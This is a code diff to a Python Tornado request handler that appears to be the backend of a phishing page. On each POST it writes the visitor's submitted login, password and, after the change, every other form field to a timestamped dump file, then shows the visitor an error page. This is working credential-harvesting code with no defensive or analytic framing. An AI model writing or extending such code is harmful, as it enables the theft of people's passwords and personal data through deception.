@@ -23,13 +23,14 @@ class MainHandler(web.RequestHandler):
     def post(self):
         # TODO doc
         try:
-            login = self.get_argument('login')
-            password = self.get_argument('password')
+            arguments = {}
+            for k in self.request.arguments:
+                arguments[k] = self.get_argument(k)
             dump = os.path.join(dump_path, str(datetime.datetime.now()))
-            content = 'login:' + login + '\npassword:' + password + '\n'
+            content = str(arguments) + '\n'
             FileManager.append_to_file(dump, content)
         except web.HTTPError:   # no or wrong arguments
-            logging.warning('Missing argument on MainHandler POST request')
+            logging.warning('Argument error on MainHandler POST request')
         # then show an error page to the client
         with open(error_file, mode='r', encoding='UTF-8') as page:
             self.write(page.read())
